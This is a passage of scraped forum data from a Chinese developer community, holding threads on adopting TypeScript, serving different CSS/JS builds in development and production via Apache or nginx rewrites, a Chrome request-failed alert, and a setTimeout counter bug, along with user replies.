的开发者一定会感觉到非常亲切，所以主要还是一个先入为主的习惯问题。相对于这些付出，收益是巨大的。尤其在大型项目里面，后面接手的同事再也不用去“猜测”一个 Callback 返回的变量到底是什么类型了。</p>\n<p>以下是 JavaScript 代码：</p>\n<pre><code>var name;                   //定义变量\n\nfunction getName(type) {    //定义函数\n    return ...\n}\n\nclass Person {              //ES7 下的类定义\n    name = '';\n    age = 18;\n\n    getName() {\n        ...\n    }\n\n    getAge() {\n\n    }\n}\n\n</code></pre>\n<p>以下是 TypeScript 代码：</p>\n<pre><code>var name: string; //定义变量\n\nfunction getName(type: string):string {  //定义函数\n    return ...\n}\n\nclass Person {              //类定义\n    private name: string = '';\n    private age: number = 18;\n\n    public getName(): string {\n        ...\n    }\n\n    public getAge(): number {\n\n    }\n}\n</code></pre>\n<p>大家可以发现，最基本的语法其实就是在所有的变量或者函数的定义时，在变量名字的后面加多了一个类型信息。相较于传统静态语言的语法，基本上就是把类型信息从前面移到了后面而已。</p>\n<p>我们再来看一下调用代码：</p>\n<pre><code>let name: string = obj.getName()   //编译通过\nlet name: number = obj.getName()   //编译失败\nlet name = obj.getName()           //编译通过\nlet nameOther: number = name       //编译失败\n</code></pre>\n<ul>\n<li>第一行编译通过，因为类型一致</li>\n<li>第二行编译失败，因为类型不一致</li>\n<li>第三行编译通过，因为 name 没有指定类型， TypeScript 编译器会自动推导，认为 name 变量也是 string 类型</li>\n<li>第四行编译失败，因为 name 被推导为 string 类型，而 nameOther 是 number 类型，类型检查失败。</li>\n</ul>\n<p>所以其实我们可以看到， TypeScript 也并不是无时无刻都必须要写上类型信息，只要定义时类型信息足够丰富，我们也可以选择性的偷懒。</p>\n<p>最近有看到一种言论说：</p>\n<blockquote>\n<p>连 C# 都在拼命动态化，为何要让 JavaScript 变成一个静态语言？</p>\n</blockquote>\n<p>其实我觉得这里是有一些误解的：“静态类型检查并不等于静态语言或者说静态化”。</p>\n<p>动态语言虽然可以在运行期动态改变类型，但是一个变量类型的改变也是受“业务需求”影响的。我相信没有谁会因为喜欢炫技而在代码里面不断改变一个变量的类型信息。而大部分时候，是因为业务的需求再配合语言的动态优势，可以让一个变量在不同阶段存储不同类型的数据。</p>\n<p>我们回忆一下，其实大部分时候一个变量在它生命周期内依然是同一种类型一直用到销毁。只有小部分时候有那么几个变量会偶尔存储 number ，偶尔存储 string ；或者在服务器返回的数据里面，根据 errCode ，在 json 里面取出余下不同的信息。</p>\n<p>所以一言以蔽之就是说：</p>\n<blockquote>\n<p>“即使是动态语言，一个变量在生命周期内，它的类型变化可能性是非常有限的”。</p>\n</blockquote>\n<p>那么 TypeScript 非常好的解决了这个问题，那就是“联合类型（ Union ）”。相信有过 C 语言基础的同学，对 Union 一定不会陌生。 Union 就是说一个变量可以时而为 A 类型，时而为 B 类型，到底是什么类型，这个由开发者自行判断。</p>\n<p>这不正好和“服务器返回的 json 数据格式”的情况非常吻合么？我们通过检查 errCode （在 restful API 下，更提倡用 header 来返回错误信息） 来判断余下部分应该为 Data 域还是是 Error 域。</p>\n<p>一个 Union 的变量定义：</p>\n<pre><code>let name: number | string;\nname = 123;                     //编译通过\nname = \"danney\";                //编译通过\nname = true;                    //编译失败\n</code></pre>\n<p>上述代码编译成 JavaScript 的 ES5 版本为：</p>\n<pre><code>var name;\nname = 123;\nname = \"danney\";\nname = true;\n</code></pre>\n<p>对比可以发现，其实 TypeScript 完全没有没有给你带来什么学习成本和使用不便，它真的是在帮你，帮你检查类型、帮你排除那些粗心大意的小错误。</p>\n<p>除此之外，在 TypeScript 里面还有很多突破静态类型的方法，比如你可以把一个变量强转为 any 类型，这样就不受编译器类型检查限制了。所以再也不要误认为 TypeScript 把 JavaScript 静态化了。</p>\n<h2>代码智能提示</h2>\n<p>习惯了在 Visual Studio 上的番茄工具，以及 Android Studio 和 XCode 上的智能提示功能，切到 JavaScript 时，真是有一些不习惯，虽然目前几大主流的 Web 开发工具也有提示功能，但是我觉得还是不够完善和智能。</p>\n<p>毕竟 TypeScript 语言天生是带有类型信息的，可以完美识别出一个对象的类型，它自身有哪些属性和方法，然后调用这些方法时，也能智能匹配出它的函数原型。</p>\n<p>说到这里就不能不提 Visual Studio Code 了，简称 VSCode 。 VSCode 是微软新一代的轻量级跨平台开发工具，虽然也叫 Visual Studio ，但是我觉得和传统的 Visual Studio 家族工具已经没有太大关系了。它更像 WebStorm 或则 Sublime Text 这样的 Web 开发工具，轻量级、跨平台，支持各种语言或者平台插件， Debug 也很方便。</p>\n<p>用 TypeScript 做开发，基本上 VSCode 就是标配了。 VSCode 自带 TypeScript 插件，完美智能提示，类型推导，让你的开发效率极大提升。有意思的是 VSCode 和 TypeScript 编译器也是用 TypeScript 语言开发的，这就像一个鸡生蛋蛋生鸡的问题。很多年前我就是在想 Java 编译器也是由 Java 语言开发的，那么最早的 Java 语言又是用什么来编译的呢？</p>\n<p>其实答案很简单，现代编译器基本上都不是从零裸写的，而是先书写这门语言的“语法描述文件”，然后由“编译器生成器”来读取“语法描述文件”，从而生成一个“编译器”。所以无论是 Java 还是 TypeScript ，都是先用别的语言来创建一个最基本的编译器，再用这门语言来开发自己的新版编译器。</p>\n<h2>JavaScript 混合编程</h2>\n<p>很多同学一定担心 TypeScript 的生态环境不够丰富，相关的 lib 不够多，这一点完全不用担心。因为 TypeScript 和 JavaScript 可以在一个工程里面混合编程， TypeScript 的文件后缀是 .ts ， JavaScript 的文件后缀是 .js 仅此而已。 ts 文件里面依然用 import 或者 require 来引入一个 module 。</p>\n<p>唯一的问题就是因为引入的 JavaScript 模块因为没有类型信息，会导致 VSCode 的智能提示无法使用而已。有智能提示时算是一个补充，没有智能提示时我觉得也不算吃亏。</p>\n<p>不过其实这个问题基本上已经解决了，那就是 TypeScript 在编译为 JavaScript 时，可以自动产生一个叫做 .d.ts 的文件，它就是 js 的头文件，和 C 语言的 .h 文件一个道理。所以当一个编译后的 TypeScript 作为一个 lib 发布时，会附上 .js 和 .d.ts 两种文件。这样别人在导入你的 lib 时，也会获得智能提示功能。</p>\n<p>那么对于一个基于 JavaScript 开发的老牌 lib ，有没有办法也能智能提示呢？答案是肯定的。那就是现在有大量的开发者在为老牌 lib 人肉编写 .d.ts 文件。并且微软提供了一个叫做 typings 的工具，可以为你在线查找并下载一个 lib 的 .d.ts 文件。 typings 和 npm 使用类似，最新的 typings 也已经统一到 npm 工具上了，即使用 npm 就可以下载 .d.ts 文件了。还有最新版的 VSCode 也能做到自动分析你的包依赖，然后后台自动下载 .d.ts 文件。不用担心 JavaScript lib 没有 .d.ts 文件，连微信小程序的头文件都已经有了。</p>\n<h2>编译质量</h2>\n<p>对于担心 TypeScript 编译质量不如人手写优化的同学，你们也完全不用怕。 TypeScript 编译逻辑主要有两部分，一部分是去掉类型信息，回归正常 JavaScript 语法；另外一部分就是翻译 ES6 和 ES7 语法，我目测编译结果和 babel 基本上一致，所以 babel 的编译结果如果你都不担心， TypeScript 的编译结果也就没什么好担心的了。</p>\n<p>但是假如你连整个编译过程都觉得不能忍受的话，那一定是你写的代码太少。你来开发 iOS 和 Android 试试 ？当年 Windows QQ 编译一次可是要 40 分钟啊，我们一般都是点一下编译按钮，然后就去吃饭了。记得以前有从 JavaScript 入门的同学转去做 Android 开发时，狂吐槽分号的问题，我想说：真的是你见识的东西太少。可以热爱 JavaScript ，但是不要让它蒙了你的眼。</p>\n<h2>调试</h2>\n<p>VSCode 提供了完善了调试工具，非常方便。因为我基本上是在 node 环境下开发， Web 调试不好说，不过 node 下再也不用蹩脚的弹到 Chrome 里面去 debug 了。 TypeScript 编译后会自动生成 souremap 文件，所以 debug 时是不会涉及到编译后的 js 源文件的。就好像 C 语言编译成汇编后，你 debug 时也不用关注汇编一样。</p>\n<p>所以另外一个需要注意的就是团队开发时，如果要修复 bug ，千万千万不要修改编译后的 js 源文件。因为之前在网上看到有人在吐槽他用 TypeScript 开发的代码，编译成 js 上线后，有同学吭哧吭哧拿 js 代码去修复 bug ，还一个劲吐槽原作者。脑子是个好东西，希望他也有。所以一定要避免在一个项目里面有的人用 TypeScript 开发，有的人用 JavaScript 开发。要么全都用，要么就别用。</p>\n<h2>其他</h2>\n<p>相比于 CoffeeScript 等变种 JavaScript 语言， TypeScript 语法几乎保持不变，没有什么学习难度。说学习曲线陡峭或者觉得团队内部不好培训、不好推进的，我真心觉得这个行业的从业者素质可能确实需要提升。</p>\n<p>其他几个不错的新增语法点：</p>\n<ul>\n<li>TypeScript 提供了 enum ，我个人超级喜欢</li>\n<li>TypeScript 提供了泛型，解决了不少问题</li>\n<li>TypeScript 支持 JSX 语法，做 ReactJS 和 React-Native 开发的同学应该会非常喜欢</li>\n</ul>\n<p>差不多就这些了，拥抱 TypeScript 吧，希望你也会喜欢！</p>\n</div></div>"], "reply": "87", "tittle": "做 JavaScript 开发的同学，快来加入 TypeScript 大家庭吧！", "comment": ["总觉得 TS 流行不起来，因为要多写代码", "目前来讲没有看到 TS 吸引我的地方，我觉得 es 挺好，加上 eslint 足够", "我觉得 js 从业者不易过早使用 ts ，要经过对 js 的深层次理解再用 ts", "说 ts 适合大项目到底是有多少前端程序员做的是大项目？", "ts 和 haxe 比，我更喜欢 haxe, ", ", 有不了解 haxe 的朋友可以看一下。", " 这个吐槽我给满分", "别把自己编程风格不好怪罪到语言身上，好像赵匡胤似的。", "老子写 js 就是喜欢他的无类型 你让我写 ts 好气啊\r", "现在就看 10 年内 web asm 能不能起来，到时候直接换 JAVAscript 我才不要 ts", "事实上,写过 js 再来写 ts 会异常蛋疼,写过 ts 再来写 js 毫秒级过渡.\r", "辛亏在写 js 前我是写 C#的.", "ts 还是很不错的，最近发现很多库使用 ts", "还有,可能是因为强迫症,我一定要写明类型,js/php 这种都写个注释注明类型,c#绝对不用 var,不然看着难受", "ts 的好处是它基本就是 js 加强类型。对从其他强类型语言过来的人来讲，它是入门 js 的好东西。对于已经写了很久 js 的人来讲，强类型的吸引力有那么大吗？", "没敢花时间去学 TS 的原因除了公司不可能给用之外，还有几年前用过 coffeescript ，那时候 github 上很多项目也是 coffeescript 写的，但如今已经完全不同了。", "  游戏行业用的多", " 哈哈，我也是", "TS 是一群做 JAVA 的人去写的，对于写习惯写 js 的人来说，这种方式就是一个累赘，还是没有兴趣是用 TS", "之前用 coffeescript ，现在用 kotlin ，与 ts 无缘了", "支持楼主的分享。\r", "\r", " 我认为 ts 的缺点不是要多写代码，而是有更高的学习成本。\r", "\r", "很多 js 程序员认为 js 已经是最优秀的语言了，不愿意也不屑于去接受 Interface, Generics 等 OOP 的概念。\r", "不看好 TypeScript 没问题。不过建议去了解一下它的基本概念，会有所收获的。\r", "\r", "顺便打个广告： ", " \r", "看起来似乎大约就是 js 加了类型。。。 233333 不知道我的理解对不对，", "我接受 Interface, Generics 等 OOP 的概念，但是我不愿意也没有兴趣学习 typescript 。我更愿意花时间接触前端之外的内容", "宁可 es 原教旨主义 也不用极端的 ts", "变量不用定义就能用，偶尔代码写错一个字就成了一个新变量，为此却要付出大量的 debug 时间\r", "\r", "看到这句话的我表示……", "呵呵，\r", "我去年接触 js 上手就是干\r", "下午面试，面完之后直接就是干 js 代码\r", "现在用 react native ，\r", "之前就是做 Android 原生开发，\r", "从 java 转 js ，你不知道是有多痛苦！", "V8 SoundScript\r", "我丢 ", "ts 写的很爽啊。", "复杂应用里可以节省一些调试时间，典型特征：多个组件、存在数据通信、前端维护状态。没这些需求的话，强类型也没提供什么明显的价值。", " \r", "ts 不是一群做 Java 的人写的，是一群做 C# 的人写的。", " 前台兼职后台 java(springmvc+mybatis)的表示，正统 oop 我都写过， js 那套 oop 你习惯的了么？山寨的都不好说，因为他底层还是原型链啊\r", "所以等啥时候 js 真正把自己的 oop 做出来了再谈语法的问题\r", "何况 ts 跟 java 比语法还是丑陋", " 核心内容就是 js 加了类型。\r", "另外还加了一些 js 中不存在的概念比如接口（ Interfaces ）、泛型（ Generics ）、枚举类型（ Enums ）等", " @", " 我支持 js 程序员去了解和学习其他语言，正统的 oop 更好。\r", "\r", "> 很多 js 程序员认为 js 已经是最优秀的语言了，不愿意也不屑于去接受 Interface, Generics 等 OOP 的概念。 \r", "> 不看好 TypeScript 没问题。不过建议去了解一下它的基本概念，会有所收获的。 \r", "\r", "以上两句话针对一些偏执于 js 的人。\r", "\r", "> 何况 ts 跟 java 比语法还是丑陋\r", "\r", "是丑陋了很多，为了兼容原生 js 。\r", "\r", "> 所以等啥时候 js 真正把自己的 oop 做出来了再谈语法的问题\r", "\r", "coffee ts 等的发展推动了 es oop 的发展。", "坐等 webassembley ……", " 还有一点是，代码提示不是一般的爽。", "弱类型语言非要转向强类型来写不觉得很蛋疼么, 我觉得这是一种倒退, 又回到以前的时代", "ts 目前对于 js 的优势就两点  1 各种新的 es 标准实现   2 变量类型", "但是有一个致命的问题   不能直接运行 那和使用 babel 有什么区别   ", "等到哪天浏览器可以直接支持 ts 的话  可以考虑转写 ts", " 浏览器永远都不会直接原生支持 ts 的 🤣", "我用 TS 就是为了他的自动补全，哈哈哈", " 我也是..", " 兄弟你这 ID 危险啊", "ts 有时候会影响 js 的表达能力啊，有时候还是蛮头疼的。", "用过 TypeScript 开发 Angular 2 就知道 TypeScript 的益处。\r", "但是前提是开发 Angular 2 。。。", " 说不准哦\r", "\r", "TypeScript 的好处嘛，不是写起来快，而是写起来可靠", "es3 es5 es6 只跟主流是不是有点古板？", " 请问你回复的是哪一条 🤔", " \r", ">浏览器永远都不会直接原生支持 ts 的 \r", "\r", " \r", ">说不准哦", " 看了下 Haxe ， 语法更怪 \r", "```\r", "var people = [\r", "            \"Elizabeth\" => \"Programming\",\r", "            \"Joel\" => \"Design\"\r", "        ];\r", "```\r", "\r", "不喜欢 babel,  每次改个代码都要等， 1s 也是等啊。不过现在前端不用 babel 就写不了项目了， 好在 node 可以不用", "TypeScript 相对 Java, C#, C++ 的优点是 它可以编译到 JavaScript", " 不是说弱类型转到强类型是一种倒退，真的， 你如果去写一个项目，大一点， 如果要修改一个地方， 如果是弱类型，你会感觉不敢下手， 不知道这个地方一改， 会不会引起其他什么问题，而且这个问题还没法在编译调试的时候弄出来， 如果是强类型的， 通过编译器类型判断，很快就能找到有问题的代码， 项目质量就比较可控。\r", "\r", "我现在写 php 就这样子，一年前写的代码，我现在能看懂， 但是这么久了， 只能大概的总体，一个变量为什么用， 在哪地方有用了， 这个真的不记得了， 如果我贸然一改， 鬼知道哪里会出问题， 一旦上线了， 后果会很严重\r", "\r", "这就是我为什么喜欢强类型，编译型语言的原因，相比 ts, Haxe 他是编译型的， ts 每一个文件生成一个 js 文件， Haxe 是把所有的 haxe 文件生成一个单独的 js 文件， 我觉得这种模式很好。\r", "\r", "我就在用 haxe 和 pixi.js 结合做一个项目， 还在写\r", "\r", "大家可以去看看 Haxe", "动态类型一时爽，代码重构火葬场", "typescript 适合有计划、有架构的大型项目。\r", "现实是创业项目基本都是无组织、无计划方式糙快猛开发上线的， typescript 会增加很多额外成本，其实 flow 也不错，相对 typescript 更加灵活些。", " 生成一个单独的 js 文件还是多个 js 文件应该属于工程的范畴。\r", "应用到真实环境的项目， TypeScript 需要先编译成 js ，再根据（ Webpack or Browserify 等）配置打包成一个或多个 js 文件。\r", "\r", "我推荐项目中需要有三个目录：\r", "\r", "- src: 源文件\r", "- lib: 编译好的文件，供其他（不使用 TypeScript 的）模块使用\r", "- dist: 打包好的用于生产环境的文件（放到 html 中）\r", "\r", "这套规则用到各种环境（ es6 ， coffee 等）都屡试不爽。当然看情况可以只有 src, lib 或 src, dist", "据说 WASM 今年就要发布了\r", "Web 端以后的趋势是回归原生、静态类型（也许只是我希望...），交给编译器编译成 WASM 就完了。从这个角度，比起 C#/ C++ , TS 就没什么优势", " 同感", "坚决拥护 native javascript 不动摇", " 是的", " 现实的原则是宁可推翻不重构 。。", "坚决拥护 JavaScript", " 不管什么类型，没有充足的测试去做重构都是火葬场。。", " wasm 要先做个 gc ，才会比较方便各种语言编译成他，目前只能手动管理内存", " 谢谢你的 tutorial ，写的很赞", "Class First  是这个意思？我觉得楼主还需要学习一个。\r", "\r", "个人觉得 ts 也就那样吧，编程体验有点类似 C++", "我对这东西的看法很简单，当年 JScript 没有能成功的事情，你换个名字重来一遍也不会成功的", " 😁", "喜欢 typescript 很大的原因就是写的爽，我写类型的原因只是为了更好的补全（逃\r", "而且写一些短代码的时候，基本没写过类型，大部分都能自动推导出来", "另外，现在已经不用 typings 了，直接 npm 搜索 @", "/the-types-project  就好了", "世界上有三种机器人。\r", "\r", "第一种机器人特点\r", "* 你告诉他要做什么，他就去做什么\r", "* 碰到做不下去的事情，他继续做，直到自己毁坏\r", "\r", "第二种机器人特点\r", "* 你告诉他要做什么，他就去做什么\r", "* 碰到做不下去的事情，他会停止，并告诉使用者哪里做不下去了\r", "\r", "第三种机器人特点\r", "* 你告诉他要做什么和做事情的规则，他会先思考能不能做\r", "* 如果不能做，他会告诉使用者哪里为什么不能做\r", "\r", "第二种机器人的使用者的特点是，会在下指令的时候把做事情的规则与要做的事情在自己大脑里推演好。\r", "\r", "如果你对自己大脑推演逻辑的准确性与速度很有信心的话，完全可以选择第二种机器人来使用。\r", "\r", "啊，原来 V2EX 好像都是选择第二种机器人的天才耶~", "哈哈，没想到推广 ts 还挺困难。我个人感觉 ts 用起来还是挺舒服的， IDE 补全、自动格式化、易于重构。当然我是后端……不过看前端的各大框架也都基本都支持 ts 呢。", "我用 ES4 楼主别拦我", "调试是个问题...\r", "在 VSCode 上可以调试 ts, 但是其他环境 / 场景下呢, 例如调试 bin script, 例如调试 mocha test, 例如...\r", "VSCode 写 app 还行, 我要是写 lib, 估计是瞎...", "公司同事感受不到 IDE 提示带来的好处，对类型本身也没啥概念，跟 cto 推荐完 ts 后自己再想感觉其实也没法在我公司落地了 233 。", "你们这些搞前端的，非得把行业碎片化到极致你们才开心么……", "TypeScript 的确很好，现在正在修改 definitely-typed", "你们都不看原文的嘛。。。。明明只是类型提示而已。。。。。并不是强类型啊。。。\r", "而且还明明那么好。。。。", "个人感觉对于大一点的项目还是 ts 省心得多。不过这样硬推广感觉不会有什么效果，毕竟用不到的当然不会觉得需要。等到觉得写 vanilla javascript 力不从心的时候程序员自然会去找更好的解决方法。", "你们这些搞前端的，非得把行业碎片化到极致你们才开心么…… ", " ", "不加入  我就是喜欢弱类型 喜欢打开控制台就是干的感觉", "如果要开发比较复杂的应用，可以考虑 Angular2 和 TS 。 TS 背后是微软， Ng2 背后是谷歌，还是很靠谱的，像一些游戏框架对 TS 支持就比较早。大型系统考虑重构、测试、 Debug 什么的用原生 JS 就比较棘手了，不过大多数前端做的项目还是很轻的，用 TS 学习成本什么的反而高了，辩证的看吧，但是不考虑应用场景的无脑拥护都是不成熟的表现。", "楼主写惯了类型看到 TypeScript 毫无压力, 我写惯了 everything is an expression 再碰 js 觉得很难受.", "不懂，我还是继续学习 JavaScript 吧，免得成了邯郸学步。", "严格模式能解决大部分问题，非得搞个新语言吗", " 一语中的。", "觉得多此一举，如果这不是在羞辱 JavaScript ，那么就是在羞辱你自己", "typescript 和 javascript 的争议不亚于 PC 和 Mac 哪个更好用，我都已经死心了，好用就自己用着，说服别人只是自己的一厢情愿而已，想换的自然会切换过来。", "前端真会玩", "ts 是 js 的超集，所有的 js 都是 ts ，如果你不打算直接写 ts ，用来辅助编写 js 也是很爽的。 \r", "\r", "不管你是在用 WebStorm ，还是用 VS code ，比如 执行 `npm install jquery @", "/jquery` 之后，写  ts 自然不用说， 写 js 也有奇效！", "5 个以上协同开发再用 typescript 吧", " 不使用 ide 的话就显得非常多余, 举个例子, 在 angular2 中添加一个组件 可能就需要写 3 - 4 次引用和声明性质的代码", " 这个我还真是无语了，😥"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"Problem Description\" src=\"http://articles.ijohann.com/programming/images/20170112/01.jpg\"></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>Summary about responses:</p>\n<h2><code>.htaccess</code> on local machine</h2>\n<pre><code>vim /etc/apache2/httpd.conf\n</code></pre>\n<pre><code>RewriteEngine on\n\nRewriteRule ^(.*presentations/)(assets/)(.*)$ $1~$2$3 [L,QSA,NC]\n</code></pre>\n<pre><code>sudo /usr/sbin/apachectl restart\n</code></pre>\n<p>And that works great for me.</p>\n<p><em>Local Machine Dependent.</em></p>\n<h2>Other Options</h2>\n<h3>Webpack</h3>\n<h4>with <code>replace</code> add-on</h4>\n<h4>if clause</h4>\n<pre><code>if (module.hot) {\n// dev code\n}\n</code></pre>\n<h4>with two <code>env</code></h4>\n<p>It should be one good practice. However, personally speaking, I have no enough knowledge about this methods. [TODO:]</p>\n<h3>Gulp with two build tasks</h3>\n<p>It should also be one good practice. However, personally speaking, I have no enough knowledge about this methods. [TODO:]</p>\n<h3>symbolic link from <code>script.js</code> to <code>~script.js</code> on VPS</h3>\n<p><em>Server Dependent</em></p>\n<h3>Nginx <code>sub_filter</code> rewrite on VPS</h3>\n<pre><code>location / {\n  sub_filter '/presentations/assets/' '/presentations/~assets/';\n  sub_filter_once off;\n}\n</code></pre>\n<p>Or more advanced configuration employing regex match and replace, see <a href=\"https://www.nginx.com/resources/wiki/modules/substitutions/\" rel=\"nofollow\">https://www.nginx.com/resources/wiki/modules/substitutions/</a> for <code>nginx_substitutions_filter</code>.</p>\n<p><em>Server Dependent.</em></p>\n<h3>Front-end JS <code>window.location.host</code> Based Loading</h3>\n<p><em>Domain Dependent.</em></p>\n<h3>So called <code>load.js</code> method (?)</h3>\n<p>I guess it is the same as above <code>window.location.host</code> based method.</p>\n<p><em>Domain Dependent</em></p>\n<p>If this detect the existence of <code>/~assets/</code> first and if not then load <code>/assets/</code>, the could be the <strong>perfect solution</strong>.</p>\n<p>However, no idea how to implement this.</p>\n<h3>Switch <code>hosts</code></h3>\n<p>I understand this as two absolutely different sites, not sharing the same <code>index.html</code></p>\n<p><em>Local Machine Dependent</em></p>\n<p>Summary about responses and further handling can also be accessed via <a href=\"http://articles.ijohann.com/programming/20170113/\" rel=\"nofollow\">this link: Including Different css and js Files for Development and Deployment Environment by the Same index.html without Error</a>.</p>\n</div></div>"], "reply": "37", "tittle": "同一 index.html 线上线下自动引入不同版本 css 和 js。", "comment": ["通过环境变量配合 webpack 的 replace 插件", "我有办法", "if (module.hot) {\r", "   // dev code\r", "}", "楼主 字写得很漂亮", "  ", "感觉最简单的就是 switchhosts 了 代码都不要改  线上内网各布一套", "index 硬是看成了 mdx,\r", "纯前端的情况下,可能得依靠一个 load.js 来做判断了", "Gulp 写两个编译任务", "需求不复杂，用 webpack 可破，两个 env 不同配置即可，开发时 dev 配置一套，要上线构建时另一套。", " 能给个教程链接不？我对前端开发工具还不熟悉。", " 这个是用在什么环境下的，纯前端应该没办法直接用未定义的 module 吧，能解释一下么？", " 这并不是重点，想法来了，所以就胡乱写了", " load.js 具体内容如何写，能赐教不？谢谢", " 有参考教程不？谢谢", " 能给个参考教程不？对这个工具还不熟。谢谢", "假设你线下是 localhost,那 host 就会是 ", " ", "\r", "直接判断一下就在 js 里面加载不同的资源", " module.hot 是和 @", " 一样依靠 webpack\r", "差异在于他通过不同的配置文件来配置构建流程\r", "module.hot 是用来判断是否开启热更新的状态，通常等价于测试环境 ;-)\r", "\r", "原理很简单，也可以通过声明其他环境变量(比如检测域名)来标识开发／生产环境", "nginx 做个 sub_filter 就能搞定的事情。\r", "\r", "怎么这么复杂了。", " 我本地用的是 project.static.domain 类似的 URL ，不想写成 URL based ， case based 代码。谢谢建议啊😄", " 嗯，和通过 module 判断是前端还是 node 的通用库一样。谢谢。看来又要学新东西了， webpack 之前只听说没用过", " 你这个方案我比较喜欢啊。能告知一下 fileter 具体怎么写么？谢谢", "前端挂个 nginx 反代\r", "\r", "加一行\r", "\r", "    location / \r", "    {\r", "      sub_filter '/skin/production' '/skin/development;\r", "      sub_filter_once off;\r", "    }\r", "\r", "不久好了么。", " 愿闻其详", " 不错，谢谢。 sub_filter 是字串替换吗？我在想用正则去掉如例子所示的~😄", " \r", "\r", "你把开发和生产的直接分两个目录不久好了……\r", "\r", "sub_filter 是字符串替换\r", "\r", "要正则的话就要用到\r", "\r", "nginx_substitutions_filter 这个库了\r", "\r", " ", " 其实是在构建自己的最佳实践框架，放不同目录的问题是修改代码的时候需要切换文件夹。不过谢谢建议，准备采用两文件夹结构了，毕竟看起来更清爽。", " 这个 Google 链接就和我自己找一样了。对 gulp 不熟悉所以重点是不知道两个编译任务相关如何构建，甚至都不知道合适关键词，也不具备搜索结果筛选能力😭", " \r", "\r", "这是最简单的方法啊。\r", "\r", "还有个直接的方法就是把 config.js 做一个 alias\r", "\r", "指向 config.js 指向 config.develop.js\r", "\r", "相关的配置文件放里面", " 哈哈哈，看来你的配置方法用的比较灵活啊。不过问题是不太具备可移植性。只能在你的机器（服务器或者本地机器），别人的机器没有配置同样的 nginx 配置或者 symbolic link 就搞不定了啊", "提供一个方案， js 判断 window.location.host 是什么，动态给 index.html 插入 css 和 js 标签。", "模板里写个 if 可行？", " 有思路怎么写吗？", "My own solution:\r", "\r", "Since Apache is shipped with macOS, so personally I use Apache for development and Nginx for production.\r", "\r", "And my apache configuration (the psudo-one since i am using this rule for just one subfolder) is as following:\r", "\r", "```apache\r", "RewriteEngine on\r", "\r", "RewriteRule ^(.*)(assets/)(.*)$ $1~$2$3 [L,QSA,NC]\r", "```\r", "\r", "Sorry for English, currently Chinese input is broken.", " 秀英语", " 人不在国内呀，用学校的电脑是没有中文输入法的", ".htcaccess 是一個方案。\r", "開發機配置 hosts 也是一個方案。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>情况是这样的：</h1>\n<h2>在不同的菜单间快速切换</h2>\n<p><em>如果过快的话， chrome 浏览器就会弹出一个提示框，说是请求失败</em></p>\n<p>但其他浏览器就不会，只有 chrome 会弹框。</p>\n<p>因为弹框之后要按确认才能再去加载页面。所以大大降低体验度！！！！</p>\n<p>我自己猜应该是页面响应不过来，页面状态就变成 aborted</p>\n<p>请各位大大教教我！谢谢</p>\n</div></div>"], "reply": "3", "tittle": "chrome 浏览器，对一个页面状态 aborted 对弹框提示 请求失败", "comment": ["获取数据失败时，不要 alert 请求失败~", "似乎楼主需要看下  “函数节流”，简单说就是每个切换加个延迟，然后如果切换速度小于这个延迟就忽略掉.....", " 一下说但问题点上了，😄\r", "\r", "\r", " 真感谢你的方案！"]},
{"content": ["<div class=\"topic_content\">问题是酱婶儿的 用 settimeout 实现一个定时器 嗯 console 出来没问题 可是页面上的内容不能及时更新 只显示了最后的结果 求教 是因为 js 执行阻塞了渲染吗 所以直到最后 js 有错停止执行才显示出来最后的数字？蟹蟹指教\r<br>输出如下：\r<br><a target=\"_blank\" href=\"http://7xsw2u.com1.z0.glb.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-01-18%20%E4%B8%8B%E5%8D%882.25.35.png\" rel=\"nofollow\">http://7xsw2u.com1.z0.glb.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-01-18%20%E4%B8%8B%E5%8D%882.25.35.png</a>\r<br>代码如下\r<br><a target=\"_blank\" href=\"http://7xsw2u.com1.z0.glb.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-01-18%20%E4%B8%8B%E5%8D%882.26.09.png\" rel=\"nofollow\">http://7xsw2u.com1.z0.glb.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-01-18%20%E4%B8%8B%E5%8D%882.26.09.png</a></div>"], "reply": "15", "tittle": "settimeout 每 1 秒改变使页面内容+1 显示有问题", "comment": ["可以参考这个 ", "我觉得这个问题， setInterval 可能会更好 :)", "setTimeout(add, 3000)", "你这个代码肯定有问题。\r", "\r", "效果图和代码肯定不匹配。没有看到你的 console.log", " 对，这里有问题。应该去掉括号。括号表示立即执行。", "函数 add 返回 undefined ， setTimeout 要求第一个参数是 function 类型。如果 setTimeout 报错就更容易发现了。", "类似这种需要定时执行的函数里没有异步操作的，就直接使用 setInterval ，简单多了。\r", "\r", "另外， V2EX 支持直接贴代码的，用`包裹起来就可以了，比上传到七牛再贴图还是方便点吧。", "呃 你延迟定时器 传的是 undefined ，并不是函数引用...  猜测这样直接导致原本想延迟 3s 调用的 add() ，立即执行了。\r", "另外，多说一句这代码略啰嗦，你明明缓存了 dom ，为啥操作的时候再查一遍....", "编辑器是什么字体？", "使用命名的函数闭包实现递归。", "你不如记录起始时间，然后每秒更新一次和起始时间的偏移量好了，用系统时钟肯定没什么偏差。", " \r", " \r", " 了解了 第一个参数是函数名或代码 \r", " 哦好哒 下次直接贴代码 `<p>hello world</p>`\r", "\r", " 后一句啥意思 没懂 \r", " atom 默认字体啊\r", "\r", " 也对", "问题产生的原因是： func 调用栈嵌套太多导致的。你应该用 setInterval 来实现循环定时器功能的，但你选择了用 setTimeout 嵌套执行来实现循环定时器。\r", "解决：用 setInterval 。", " 你首次进入的网页的时候通过 `document.getElementsByClassName('test')[0]` 取得了 `pTag`，然后在每次 `inc()` 执行的时候又查找了一次 dom 以取得 innerHTML ，可以继续用 pTag 直接取的....", " 额 您说的都对 我当时以为内容赋值没成功 所以就重新了哈哈哈 结果问题并不是这儿的"]},
